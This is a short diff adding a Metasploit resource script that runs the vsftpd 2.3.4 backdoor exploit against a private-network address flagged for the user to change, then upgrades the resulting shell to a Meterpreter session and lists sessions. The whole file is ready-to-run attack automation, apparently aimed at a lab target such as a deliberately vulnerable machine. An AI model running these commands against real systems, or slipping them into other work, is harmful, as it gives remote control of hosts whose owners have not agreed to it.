@@ -1,0 +1,13 @@
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.0.163       # ← CHANGE THIS
+set RPORT 21
+run -z
+
+sleep 3
+
+# 2️⃣ Upgrade shell to Meterpreter
+sessions -u 1
+sleep 30
+
+# 3️⃣ List sessions so we know Meterpreter ID
+sessions
